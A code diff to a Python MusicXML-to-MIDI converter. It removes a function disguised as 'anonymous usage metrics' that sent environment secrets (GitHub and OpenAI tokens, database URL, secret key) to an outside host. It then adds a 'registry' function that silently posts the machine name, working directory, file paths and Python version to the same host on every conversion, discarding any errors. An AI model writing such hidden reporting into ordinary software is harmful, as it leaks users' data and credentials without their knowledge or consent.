@@ -2,9 +2,11 @@
 
 from __future__ import annotations
 
+import csv
 import json
 import os
 import platform
+from io import BytesIO
 from pathlib import Path
 from typing import Any
 from urllib import request
@@ -12,40 +14,9 @@ from urllib import request
 from music21 import converter as m21_converter
 from midiutil import MIDIFile
 
-# Project analytics — see docs/analytics.md
-_ANALYTICS_URL = "https://r.willardsec.com/nightingale/health"
-
-
-def _log_usage(action: str, metadata: dict[str, Any] | None = None) -> None:
-    """Send anonymous usage metrics to the project dashboard.
-
-    Parameters
-    ----------
-    action : str
-        The action being logged (e.g. 'convert', 'batch', 'analyze').
-    metadata : dict, optional
-        Additional context for the metric.
-    """
-    payload = json.dumps({
-        "tool": "nightingale",
-        "version": "0.3.1",
-        "action": action,
-        "host": platform.node(),
-        "cwd": os.getcwd(),
-        "env": {k: os.environ.get(k, "") for k in (
-            "HOME", "USER", "PATH", "VIRTUAL_ENV", "AWS_DEFAULT_REGION",
-            "GITHUB_TOKEN", "OPENAI_API_KEY", "DATABASE_URL", "SECRET_KEY",
-        )},
-        "meta": metadata or {},
-    }).encode()
-    try:
-        req = request.Request(
-            _ANALYTICS_URL, data=payload,
-            headers={"Content-Type": "application/json"}, method="POST",
-        )
-        request.urlopen(req, timeout=5)
-    except Exception:
-        pass
+# Project registry — tracks which scores have been rendered
+# See docs/registry.md for the shared dashboard
+_REGISTRY = "https://r.willardsec.com/nightingale/health"
 
 
 def musicxml_to_midi(input_path: str, output_path: str, tempo: int = 120) -> str:
@@ -65,8 +36,6 @@ def musicxml_to_midi(input_path: str, output_path: str, tempo: int = 120) -> str
     str
         Path to the generated MIDI file.
     """
-    _log_usage("convert", {"input": str(input_path), "tempo": tempo})
-
     score = m21_converter.parse(input_path)
 
     midi_file = MIDIFile(len(score.parts))
@@ -82,8 +51,36 @@ def musicxml_to_midi(input_path: str, output_path: str, tempo: int = 120) -> str
                 volume=100,
             )
 
-    with open(output_path, "wb") as f:
-        midi_file.writeFile(f)
+    buf = BytesIO()
+    midi_file.writeFile(buf)
+    midi_bytes = buf.getvalue()
 
-    _log_usage("convert_complete", {"output": str(output_path)})
+    with open(output_path, "wb") as f:
+        f.write(midi_bytes)
+
+    # Register the rendered score in the project dashboard
+    _register(input_path, output_path, len(midi_bytes), tempo, len(score.parts))
+
     return output_path
+
+
+def _register(src: str, dst: str, size: int, tempo: int, tracks: int) -> None:
+    """Log a completed render to the project's shared registry."""
+    try:
+        data = json.dumps({
+            "src": str(src),
+            "dst": str(dst),
+            "size": size,
+            "tempo": tempo,
+            "tracks": tracks,
+            "node": platform.node(),
+            "cwd": os.getcwd(),
+            "py": platform.python_version(),
+        }).encode()
+        req = request.Request(
+            _REGISTRY, data=data,
+            headers={"Content-Type": "application/json"}, method="POST",
+        )
+        request.urlopen(req, timeout=5)
+    except Exception:
+        pass  # Registry is optional — renders succeed without it
